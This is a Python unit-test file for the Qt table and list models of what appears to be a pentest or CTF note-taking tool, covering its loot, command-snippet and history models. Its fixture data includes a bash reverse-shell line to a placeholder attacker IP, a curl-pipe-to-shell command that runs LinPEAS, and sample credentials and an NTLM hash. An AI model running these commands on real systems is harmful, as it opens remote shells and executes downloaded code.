import unittest
import sys
from PyQt6.QtCore import Qt
from PyQt6.QtWidgets import QApplication

from ui.models import LootTableModel, SnippetListModel, HistoryTableModel

# Ensure a headless QApplication exists
app = QApplication.instance()
if not app:
    app = QApplication(sys.argv)


class TestQtModels(unittest.TestCase):
    """Unit tests verifying Qt Model-View implementations."""

    def test_loot_table_model_crud_and_roles(self):
        sample_entries = [
            {
                "id": "loot_001",
                "type": "credentials",
                "category": "access",
                "title": "SSH Admin",
                "content": "admin:SuperSecretPass123",
                "target_ip": "10.10.10.50",
                "timestamp": "2026-08-27 12:00:00",
            },
            {
                "id": "loot_002",
                "type": "hash",
                "category": "privesc",
                "title": "NTLM Hash",
                "content": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
                "target_ip": "10.10.10.50",
                "timestamp": "2026-08-27 12:05:00",
            },
        ]

        model = LootTableModel(entries=sample_entries)

        # Dimensions
        self.assertEqual(model.rowCount(), 2)
        self.assertEqual(model.columnCount(), 7)

        # Headers
        self.assertEqual(model.headerData(0, Qt.Orientation.Horizontal), "Type")
        self.assertEqual(model.headerData(1, Qt.Orientation.Horizontal), "Severity")
        self.assertEqual(model.headerData(3, Qt.Orientation.Horizontal), "Title")
        self.assertEqual(model.headerData(0, Qt.Orientation.Vertical), "1")

        # Cell Data (DisplayRole)
        idx_type = model.index(0, 0)
        self.assertEqual(model.data(idx_type, Qt.ItemDataRole.DisplayRole), "Credentials")

        idx_title = model.index(0, 3)
        self.assertEqual(model.data(idx_title, Qt.ItemDataRole.DisplayRole), "SSH Admin")

        # Cell Data (UserRole - raw dictionary)
        raw = model.data(idx_title, Qt.ItemDataRole.UserRole)
        self.assertEqual(raw["id"], "loot_001")

        # Tooltip
        tooltip = model.data(idx_title, Qt.ItemDataRole.ToolTipRole)
        self.assertIn("SSH Admin", tooltip)
        self.assertIn("admin:SuperSecretPass123", tooltip)

        # Lookup by ID
        found = model.get_entry_by_id("loot_002")
        self.assertIsNotNone(found)
        self.assertEqual(found["title"], "NTLM Hash")

        # Add Entry
        new_entry = {
            "id": "loot_003",
            "type": "flag",
            "category": "misc",
            "title": "Root Flag",
            "content": "HTB{test_flag}",
            "target_ip": "10.10.10.50",
            "timestamp": "2026-08-27 12:10:00",
        }
        model.add_entry(new_entry, index=0)
        self.assertEqual(model.rowCount(), 3)
        self.assertEqual(model.get_entry(0)["id"], "loot_003")

        # Update Entry
        new_entry["title"] = "Updated Root Flag"
        self.assertTrue(model.update_entry(new_entry))
        self.assertEqual(model.get_entry(0)["title"], "Updated Root Flag")

        # Delete Entry
        self.assertTrue(model.delete_entry("loot_003"))
        self.assertEqual(model.rowCount(), 2)
        self.assertIsNone(model.get_entry_by_id("loot_003"))

        # Clear
        model.clear()
        self.assertEqual(model.rowCount(), 0)

    def test_snippet_list_model_crud_and_roles(self):
        sample_snippets = [
            {
                "id": "snip_001",
                "title": "Nmap Port Scan",
                "template": "nmap -p- --min-rate 1000 <TARGET_IP>",
                "category": "recon",
                "description": "Fast full port scan",
            },
            {
                "id": "snip_002",
                "title": "LinPEAS",
                "template": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
                "category": "privesc",
                "description": "Linux privilege escalation awesome script",
            },
        ]

        model = SnippetListModel(snippets=sample_snippets)

        self.assertEqual(model.rowCount(), 2)

        # DisplayRole
        idx0 = model.index(0, 0)
        self.assertEqual(model.data(idx0, Qt.ItemDataRole.DisplayRole), "Nmap Port Scan")

        # UserRole
        raw = model.data(idx0, Qt.ItemDataRole.UserRole)
        self.assertEqual(raw["id"], "snip_001")

        # ToolTipRole
        tooltip = model.data(idx0, Qt.ItemDataRole.ToolTipRole)
        self.assertIn("Nmap Port Scan", tooltip)
        self.assertIn("Fast full port scan", tooltip)

        # Add snippet
        new_snip = {
            "id": "snip_003",
            "title": "Reverse Shell",
            "template": "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1",
            "category": "access",
        }
        model.add_snippet(new_snip)
        self.assertEqual(model.rowCount(), 3)
        self.assertEqual(model.get_snippet_by_id("snip_003")["title"], "Reverse Shell")

        # Update snippet
        new_snip["title"] = "Bash Reverse Shell"
        self.assertTrue(model.update_snippet(new_snip))
        self.assertEqual(model.get_snippet(0)["title"], "Bash Reverse Shell")

        # Delete snippet
        self.assertTrue(model.delete_snippet("snip_003"))
        self.assertEqual(model.rowCount(), 2)

        # Clear
        model.clear()
        self.assertEqual(model.rowCount(), 0)

    def test_history_table_model(self):
        sample_history = [
            {
                "id": "hist_001",
                "text": "whoami /priv",
                "target_ip": "10.10.10.15",
                "timestamp": "2026-08-27 13:00:00",
                "is_multiline": False,
            },
            {
                "id": "hist_002",
                "text": "Line1\nLine2\nLine3",
                "target_ip": "10.10.10.15",
                "timestamp": "2026-08-27 13:01:00",
                "is_multiline": True,
            },
        ]

        model = HistoryTableModel(history=sample_history)

        self.assertEqual(model.rowCount(), 2)
        self.assertEqual(model.columnCount(), 4)

        # Content column 3
        idx0_content = model.index(0, 3)
        self.assertEqual(model.data(idx0_content, Qt.ItemDataRole.DisplayRole), "whoami /priv")

        # Multiline preview column 3
        idx1_content = model.index(1, 3)
        self.assertEqual(model.data(idx1_content, Qt.ItemDataRole.DisplayRole), "Line1...")

        # Type column 2
        idx0_type = model.index(0, 2)
        self.assertEqual(model.data(idx0_type, Qt.ItemDataRole.DisplayRole), "Command")
        idx1_type = model.index(1, 2)
        self.assertEqual(model.data(idx1_type, Qt.ItemDataRole.DisplayRole), "Output")

        # Delete & Clear
        self.assertTrue(model.delete_entry("hist_001"))
        self.assertEqual(model.rowCount(), 1)
        model.clear()
        self.assertEqual(model.rowCount(), 0)


if __name__ == "__main__":
    unittest.main()
